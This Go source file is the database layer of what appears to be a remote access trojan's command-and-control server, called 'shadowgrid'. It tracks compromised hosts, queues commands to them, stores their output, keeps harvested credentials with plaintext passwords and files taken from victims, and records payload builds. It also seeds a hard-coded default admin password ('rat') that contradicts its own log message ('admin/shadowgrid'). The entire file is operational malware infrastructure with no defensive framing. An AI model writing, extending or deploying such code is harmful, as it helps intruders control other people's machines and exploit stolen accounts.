package database

import (
	"database/sql"
	"log"
	"time"

	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/crypto/bcrypt"

	"shadowgrid/models"
)

type DB struct {
	*sql.DB
}

func New(path string) (*DB, error) {
	db, err := sql.Open("sqlite3", path+"?_journal_mode=WAL&_busy_timeout=5000")
	if err != nil {
		return nil, err
	}
	db.SetMaxOpenConns(1)
	d := &DB{db}
	if err := d.migrate(); err != nil {
		return nil, err
	}
	d.ensureAdmin()
	return d, nil
}

func (d *DB) migrate() error {
	stmts := []string{
		`CREATE TABLE IF NOT EXISTS operators (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			username TEXT UNIQUE NOT NULL,
			password_hash TEXT NOT NULL,
			role TEXT DEFAULT 'operator',
			created_at DATETIME DEFAULT CURRENT_TIMESTAMP
		)`,
		`CREATE TABLE IF NOT EXISTS listeners (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			name TEXT NOT NULL,
			type TEXT DEFAULT 'https',
			bind_host TEXT DEFAULT '0.0.0.0',
			bind_port INTEGER DEFAULT 443,
			domain TEXT DEFAULT '',
			status TEXT DEFAULT 'stopped',
			config_json TEXT DEFAULT '{}',
			created_at DATETIME DEFAULT CURRENT_TIMESTAMP
		)`,
		`CREATE TABLE IF NOT EXISTS agents (
			id TEXT PRIMARY KEY,
			hostname TEXT DEFAULT '',
			username TEXT DEFAULT '',
			os TEXT DEFAULT '',
			arch TEXT DEFAULT '',
			process_name TEXT DEFAULT '',
			pid INTEGER DEFAULT 0,
			ip_internal TEXT DEFAULT '',
			ip_external TEXT DEFAULT '',
			country TEXT DEFAULT '',
			domain_name TEXT DEFAULT '',
			is_admin INTEGER DEFAULT 0,
			sleep_seconds INTEGER DEFAULT 5,
			jitter_percent INTEGER DEFAULT 20,
			listener_id INTEGER DEFAULT 0,
			first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
			last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
			status TEXT DEFAULT 'active'
		)`,
		`CREATE TABLE IF NOT EXISTS tasks (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			agent_id TEXT NOT NULL,
			task_type TEXT NOT NULL,
			args_json TEXT DEFAULT '{}',
			status TEXT DEFAULT 'pending',
			created_by TEXT DEFAULT '',
			created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
			sent_at DATETIME,
			completed_at DATETIME
		)`,
		`CREATE TABLE IF NOT EXISTS results (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			task_id INTEGER NOT NULL,
			agent_id TEXT NOT NULL,
			output TEXT DEFAULT '',
			output_type TEXT DEFAULT 'text',
			created_at DATETIME DEFAULT CURRENT_TIMESTAMP
		)`,
		`CREATE TABLE IF NOT EXISTS credentials (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			agent_id TEXT DEFAULT '',
			source TEXT DEFAULT '',
			url TEXT DEFAULT '',
			username TEXT DEFAULT '',
			password TEXT DEFAULT '',
			notes TEXT DEFAULT '',
			created_at DATETIME DEFAULT CURRENT_TIMESTAMP
		)`,
		`CREATE TABLE IF NOT EXISTS files (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			agent_id TEXT DEFAULT '',
			filename TEXT DEFAULT '',
			filepath TEXT DEFAULT '',
			size INTEGER DEFAULT 0,
			direction TEXT DEFAULT 'download',
			local_path TEXT DEFAULT '',
			created_at DATETIME DEFAULT CURRENT_TIMESTAMP
		)`,
		`CREATE TABLE IF NOT EXISTS settings (
			key TEXT PRIMARY KEY,
			value TEXT DEFAULT ''
		)`,
		`CREATE TABLE IF NOT EXISTS activity (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			type TEXT DEFAULT '',
			message TEXT DEFAULT '',
			created_at DATETIME DEFAULT CURRENT_TIMESTAMP
		)`,
		`CREATE TABLE IF NOT EXISTS builds (
			id TEXT PRIMARY KEY,
			config_json TEXT DEFAULT '{}',
			status TEXT DEFAULT 'queued',
			github_run_id INTEGER DEFAULT 0,
			artifact_url TEXT DEFAULT '',
			error TEXT DEFAULT '',
			created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
			completed_at DATETIME
		)`,
		`CREATE INDEX IF NOT EXISTS idx_builds_status ON builds(status)`,
		`CREATE INDEX IF NOT EXISTS idx_agents_status ON agents(status)`,
		`CREATE INDEX IF NOT EXISTS idx_agents_last_seen ON agents(last_seen)`,
		`CREATE INDEX IF NOT EXISTS idx_tasks_agent_id ON tasks(agent_id)`,
		`CREATE INDEX IF NOT EXISTS idx_tasks_status ON tasks(status)`,
		`CREATE INDEX IF NOT EXISTS idx_credentials_agent_id ON credentials(agent_id)`,
		`CREATE INDEX IF NOT EXISTS idx_results_task_id ON results(task_id)`,
	}
	for _, s := range stmts {
		if _, err := d.Exec(s); err != nil {
			return err
		}
	}
	return nil
}

func (d *DB) ensureAdmin() {
	var count int
	d.QueryRow("SELECT COUNT(*) FROM operators WHERE username='admin'").Scan(&count)
	if count == 0 {
		hash, _ := bcrypt.GenerateFromPassword([]byte("rat"), bcrypt.DefaultCost)
		d.Exec("INSERT INTO operators (username, password_hash, role) VALUES (?, ?, ?)",
			"admin", string(hash), "admin")
		log.Println("[DB] Default admin user created (admin/shadowgrid)")
	}
}

// === OPERATORS ===

func (d *DB) GetOperatorByUsername(username string) (*models.Operator, error) {
	op := &models.Operator{}
	err := d.QueryRow(
		"SELECT id, username, password_hash, role, created_at FROM operators WHERE username=?", username,
	).Scan(&op.ID, &op.Username, &op.PasswordHash, &op.Role, &op.CreatedAt)
	if err != nil {
		return nil, err
	}
	return op, nil
}

// === AGENTS ===

func (d *DB) GetAgents(status, search string) ([]models.Agent, error) {
	query := "SELECT id,hostname,username,os,arch,process_name,pid,ip_internal,ip_external,country,domain_name,is_admin,sleep_seconds,jitter_percent,listener_id,first_seen,last_seen,status FROM agents WHERE 1=1"
	args := []interface{}{}
	if status != "" && status != "all" {
		query += " AND status=?"
		args = append(args, status)
	}
	if search != "" {
		query += " AND (hostname LIKE ? OR username LIKE ? OR id LIKE ? OR ip_external LIKE ?)"
		s := "%" + search + "%"
		args = append(args, s, s, s, s)
	}
	query += " ORDER BY last_seen DESC"
	rows, err := d.Query(query, args...)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var agents []models.Agent
	for rows.Next() {
		var a models.Agent
		var isAdmin int
		err := rows.Scan(&a.ID, &a.Hostname, &a.Username, &a.OS, &a.Arch, &a.ProcessName, &a.PID,
			&a.IPInternal, &a.IPExternal, &a.Country, &a.DomainName, &isAdmin,
			&a.SleepSeconds, &a.JitterPct, &a.ListenerID, &a.FirstSeen, &a.LastSeen, &a.Status)
		if err != nil {
			continue
		}
		a.IsAdmin = isAdmin == 1
		agents = append(agents, a)
	}
	return agents, nil
}

func (d *DB) GetAgent(id string) (*models.Agent, error) {
	a := &models.Agent{}
	var isAdmin int
	err := d.QueryRow(
		"SELECT id,hostname,username,os,arch,process_name,pid,ip_internal,ip_external,country,domain_name,is_admin,sleep_seconds,jitter_percent,listener_id,first_seen,last_seen,status FROM agents WHERE id=?", id,
	).Scan(&a.ID, &a.Hostname, &a.Username, &a.OS, &a.Arch, &a.ProcessName, &a.PID,
		&a.IPInternal, &a.IPExternal, &a.Country, &a.DomainName, &isAdmin,
		&a.SleepSeconds, &a.JitterPct, &a.ListenerID, &a.FirstSeen, &a.LastSeen, &a.Status)
	if err != nil {
		return nil, err
	}
	a.IsAdmin = isAdmin == 1
	return a, nil
}

func (d *DB) UpsertAgent(a *models.Agent) error {
	isAdmin := 0
	if a.IsAdmin {
		isAdmin = 1
	}
	_, err := d.Exec(`INSERT INTO agents (id,hostname,username,os,arch,process_name,pid,ip_internal,ip_external,country,domain_name,is_admin,sleep_seconds,jitter_percent,listener_id,first_seen,last_seen,status)
		VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
		ON CONFLICT(id) DO UPDATE SET hostname=excluded.hostname,username=excluded.username,os=excluded.os,arch=excluded.arch,
		process_name=excluded.process_name,pid=excluded.pid,ip_internal=excluded.ip_internal,ip_external=excluded.ip_external,
		country=excluded.country,domain_name=excluded.domain_name,is_admin=excluded.is_admin,last_seen=excluded.last_seen,status='active'`,
		a.ID, a.Hostname, a.Username, a.OS, a.Arch, a.ProcessName, a.PID,
		a.IPInternal, a.IPExternal, a.Country, a.DomainName, isAdmin,
		a.SleepSeconds, a.JitterPct, a.ListenerID, a.FirstSeen, time.Now(), a.Status)
	return err
}

func (d *DB) UpdateAgentLastSeen(id string) error {
	_, err := d.Exec("UPDATE agents SET last_seen=?, status='active' WHERE id=?", time.Now(), id)
	return err
}

func (d *DB) DeleteAgent(id string) error {
	_, err := d.Exec("DELETE FROM agents WHERE id=?", id)
	return err
}

// === TASKS ===

func (d *DB) CreateTask(t *models.Task) (int64, error) {
	res, err := d.Exec("INSERT INTO tasks (agent_id,task_type,args_json,status,created_by) VALUES (?,?,?,?,?)",
		t.AgentID, t.TaskType, t.ArgsJSON, "pending", t.CreatedBy)
	if err != nil {
		return 0, err
	}
	return res.LastInsertId()
}

func (d *DB) GetTasksForAgent(agentID string) ([]models.Task, error) {
	rows, err := d.Query("SELECT id,agent_id,task_type,args_json,status,created_by,created_at,sent_at,completed_at FROM tasks WHERE agent_id=? ORDER BY id DESC", agentID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var tasks []models.Task
	for rows.Next() {
		var t models.Task
		rows.Scan(&t.ID, &t.AgentID, &t.TaskType, &t.ArgsJSON, &t.Status, &t.CreatedBy, &t.CreatedAt, &t.SentAt, &t.CompletedAt)
		tasks = append(tasks, t)
	}
	return tasks, nil
}

func (d *DB) GetPendingTasks(agentID string) ([]models.Task, error) {
	rows, err := d.Query("SELECT id,agent_id,task_type,args_json,status,created_by,created_at FROM tasks WHERE agent_id=? AND status='pending' ORDER BY id ASC", agentID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var tasks []models.Task
	for rows.Next() {
		var t models.Task
		rows.Scan(&t.ID, &t.AgentID, &t.TaskType, &t.ArgsJSON, &t.Status, &t.CreatedBy, &t.CreatedAt)
		tasks = append(tasks, t)
	}
	// Mark as sent
	for _, t := range tasks {
		d.Exec("UPDATE tasks SET status='sent', sent_at=? WHERE id=?", time.Now(), t.ID)
	}
	return tasks, nil
}

func (d *DB) CompleteTask(taskID int, output, outputType string) error {
	_, err := d.Exec("UPDATE tasks SET status='completed', completed_at=? WHERE id=?", time.Now(), taskID)
	if err != nil {
		return err
	}
	var agentID string
	d.QueryRow("SELECT agent_id FROM tasks WHERE id=?", taskID).Scan(&agentID)
	_, err = d.Exec("INSERT INTO results (task_id, agent_id, output, output_type) VALUES (?,?,?,?)",
		taskID, agentID, output, outputType)
	return err
}

// === RESULTS ===

func (d *DB) GetResultsForAgent(agentID string) ([]models.Result, error) {
	rows, err := d.Query("SELECT id,task_id,agent_id,output,output_type,created_at FROM results WHERE agent_id=? ORDER BY id DESC", agentID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var results []models.Result
	for rows.Next() {
		var r models.Result
		rows.Scan(&r.ID, &r.TaskID, &r.AgentID, &r.Output, &r.OutputType, &r.CreatedAt)
		results = append(results, r)
	}
	return results, nil
}

// === CREDENTIALS ===

func (d *DB) GetCredentials(agentID, source, search string) ([]models.Credential, error) {
	query := "SELECT id,agent_id,source,url,username,password,notes,created_at FROM credentials WHERE 1=1"
	args := []interface{}{}
	if agentID != "" {
		query += " AND agent_id=?"
		args = append(args, agentID)
	}
	if source != "" {
		query += " AND source=?"
		args = append(args, source)
	}
	if search != "" {
		query += " AND (username LIKE ? OR url LIKE ? OR password LIKE ?)"
		s := "%" + search + "%"
		args = append(args, s, s, s)
	}
	query += " ORDER BY id DESC"
	rows, err := d.Query(query, args...)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var creds []models.Credential
	for rows.Next() {
		var c models.Credential
		rows.Scan(&c.ID, &c.AgentID, &c.Source, &c.URL, &c.Username, &c.Password, &c.Notes, &c.CreatedAt)
		creds = append(creds, c)
	}
	return creds, nil
}

func (d *DB) CreateCredential(c *models.Credential) error {
	_, err := d.Exec("INSERT INTO credentials (agent_id,source,url,username,password,notes) VALUES (?,?,?,?,?,?)",
		c.AgentID, c.Source, c.URL, c.Username, c.Password, c.Notes)
	return err
}

// === FILES ===

func (d *DB) GetFiles(agentID, direction string) ([]models.File, error) {
	query := "SELECT id,agent_id,filename,filepath,size,direction,local_path,created_at FROM files WHERE 1=1"
	args := []interface{}{}
	if agentID != "" {
		query += " AND agent_id=?"
		args = append(args, agentID)
	}
	if direction != "" {
		query += " AND direction=?"
		args = append(args, direction)
	}
	query += " ORDER BY id DESC"
	rows, err := d.Query(query, args...)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var files []models.File
	for rows.Next() {
		var f models.File
		rows.Scan(&f.ID, &f.AgentID, &f.Filename, &f.Filepath, &f.Size, &f.Direction, &f.LocalPath, &f.CreatedAt)
		files = append(files, f)
	}
	return files, nil
}

func (d *DB) CreateFile(f *models.File) (int64, error) {
	res, err := d.Exec("INSERT INTO files (agent_id,filename,filepath,size,direction,local_path) VALUES (?,?,?,?,?,?)",
		f.AgentID, f.Filename, f.Filepath, f.Size, f.Direction, f.LocalPath)
	if err != nil {
		return 0, err
	}
	return res.LastInsertId()
}

func (d *DB) GetFile(id int) (*models.File, error) {
	f := &models.File{}
	err := d.QueryRow("SELECT id,agent_id,filename,filepath,size,direction,local_path,created_at FROM files WHERE id=?", id).
		Scan(&f.ID, &f.AgentID, &f.Filename, &f.Filepath, &f.Size, &f.Direction, &f.LocalPath, &f.CreatedAt)
	if err != nil {
		return nil, err
	}
	return f, nil
}

// === LISTENERS ===

func (d *DB) GetListeners() ([]models.Listener, error) {
	rows, err := d.Query("SELECT id,name,type,bind_host,bind_port,domain,status,config_json,created_at FROM listeners ORDER BY id")
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var listeners []models.Listener
	for rows.Next() {
		var l models.Listener
		rows.Scan(&l.ID, &l.Name, &l.Type, &l.BindHost, &l.BindPort, &l.Domain, &l.Status, &l.ConfigJSON, &l.CreatedAt)
		listeners = append(listeners, l)
	}
	return listeners, nil
}

func (d *DB) CreateListener(l *models.Listener) (int64, error) {
	res, err := d.Exec("INSERT INTO listeners (name,type,bind_host,bind_port,domain,status,config_json) VALUES (?,?,?,?,?,?,?)",
		l.Name, l.Type, l.BindHost, l.BindPort, l.Domain, "stopped", l.ConfigJSON)
	if err != nil {
		return 0, err
	}
	return res.LastInsertId()
}

func (d *DB) UpdateListener(id int, l *models.Listener) error {
	_, err := d.Exec("UPDATE listeners SET name=?,type=?,bind_host=?,bind_port=?,domain=?,config_json=? WHERE id=?",
		l.Name, l.Type, l.BindHost, l.BindPort, l.Domain, l.ConfigJSON, id)
	return err
}

func (d *DB) UpdateListenerStatus(id int, status string) error {
	_, err := d.Exec("UPDATE listeners SET status=? WHERE id=?", status, id)
	return err
}

func (d *DB) GetListener(id int) (*models.Listener, error) {
	var l models.Listener
	err := d.QueryRow("SELECT id,name,type,bind_host,bind_port,domain,status,config_json,created_at FROM listeners WHERE id=?", id).
		Scan(&l.ID, &l.Name, &l.Type, &l.BindHost, &l.BindPort, &l.Domain, &l.Status, &l.ConfigJSON, &l.CreatedAt)
	if err != nil {
		return nil, err
	}
	return &l, nil
}

// === SETTINGS ===

func (d *DB) GetSettings() (map[string]string, error) {
	rows, err := d.Query("SELECT key, value FROM settings")
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	settings := map[string]string{}
	for rows.Next() {
		var k, v string
		rows.Scan(&k, &v)
		settings[k] = v
	}
	return settings, nil
}

func (d *DB) SetSetting(key, value string) error {
	_, err := d.Exec("INSERT INTO settings (key, value) VALUES (?,?) ON CONFLICT(key) DO UPDATE SET value=excluded.value", key, value)
	return err
}

// === STATS ===

func (d *DB) GetStats() (map[string]int, error) {
	stats := map[string]int{}
	var v int
	d.QueryRow("SELECT COUNT(*) FROM agents WHERE status='active'").Scan(&v); stats["active_agents"] = v
	d.QueryRow("SELECT COUNT(*) FROM agents WHERE status='dormant'").Scan(&v); stats["dormant_agents"] = v
	d.QueryRow("SELECT COUNT(*) FROM agents WHERE status='dead'").Scan(&v); stats["dead_agents"] = v
	d.QueryRow("SELECT COUNT(*) FROM agents").Scan(&v); stats["total_agents"] = v
	d.QueryRow("SELECT COUNT(*) FROM tasks WHERE DATE(created_at)=DATE('now')").Scan(&v); stats["tasks_today"] = v
	d.QueryRow("SELECT COUNT(*) FROM credentials").Scan(&v); stats["credentials"] = v
	d.QueryRow("SELECT COUNT(*) FROM listeners WHERE status='running'").Scan(&v); stats["active_listeners"] = v
	d.QueryRow("SELECT COUNT(*) FROM listeners").Scan(&v); stats["total_listeners"] = v
	return stats, nil
}

// === ACTIVITY ===

func (d *DB) LogActivity(actType, message string) {
	d.Exec("INSERT INTO activity (type, message) VALUES (?,?)", actType, message)
}

func (d *DB) GetActivity(limit int) ([]map[string]string, error) {
	if limit <= 0 {
		limit = 50
	}
	rows, err := d.Query("SELECT type, message, created_at FROM activity ORDER BY id DESC LIMIT ?", limit)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var activities []map[string]string
	for rows.Next() {
		var t, m, c string
		rows.Scan(&t, &m, &c)
		activities = append(activities, map[string]string{"type": t, "message": m, "created_at": c})
	}
	return activities, nil
}

// === BUILDS ===

func (d *DB) CreateBuild(id, configJSON string) error {
	_, err := d.Exec("INSERT INTO builds (id, config_json, status) VALUES (?, ?, 'queued')", id, configJSON)
	return err
}

func (d *DB) GetBuild(id string) (*BuildRecord, error) {
	b := &BuildRecord{}
	var completedAt sql.NullString
	err := d.QueryRow(
		"SELECT id, config_json, status, github_run_id, artifact_url, error, created_at, completed_at FROM builds WHERE id=?", id,
	).Scan(&b.ID, &b.ConfigJSON, &b.Status, &b.GHRunID, &b.ArtifactURL, &b.Error, &b.CreatedAt, &completedAt)
	if err != nil {
		return nil, err
	}
	if completedAt.Valid {
		b.CompletedAt = completedAt.String
	}
	return b, nil
}

func (d *DB) UpdateBuildStatus(id, status string, ghRunID int64, artifactURL, errMsg string) error {
	if status == "completed" || status == "failed" {
		_, err := d.Exec(
			"UPDATE builds SET status=?, github_run_id=?, artifact_url=?, error=?, completed_at=? WHERE id=?",
			status, ghRunID, artifactURL, errMsg, time.Now(), id,
		)
		return err
	}
	_, err := d.Exec(
		"UPDATE builds SET status=?, github_run_id=?, artifact_url=?, error=? WHERE id=?",
		status, ghRunID, artifactURL, errMsg, id,
	)
	return err
}

func (d *DB) GetBuilds() ([]map[string]interface{}, error) {
	rows, err := d.Query("SELECT id, config_json, status, github_run_id, error, created_at, completed_at FROM builds ORDER BY created_at DESC LIMIT 50")
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var builds []map[string]interface{}
	for rows.Next() {
		var id, configJSON, status, errMsg, createdAt string
		var ghRunID int64
		var completedAt sql.NullString
		rows.Scan(&id, &configJSON, &status, &ghRunID, &errMsg, &createdAt, &completedAt)
		ca := ""
		if completedAt.Valid {
			ca = completedAt.String
		}
		builds = append(builds, map[string]interface{}{
			"id":            id,
			"config_json":   configJSON,
			"status":        status,
			"github_run_id": ghRunID,
			"error":         errMsg,
			"created_at":    createdAt,
			"completed_at":  ca,
		})
	}
	return builds, nil
}

// BuildRecord represents a build in the database
type BuildRecord struct {
	ID          string
	ConfigJSON  string
	Status      string
	GHRunID     int64
	ArtifactURL string
	Error       string
	CreatedAt   string
	CompletedAt string
}
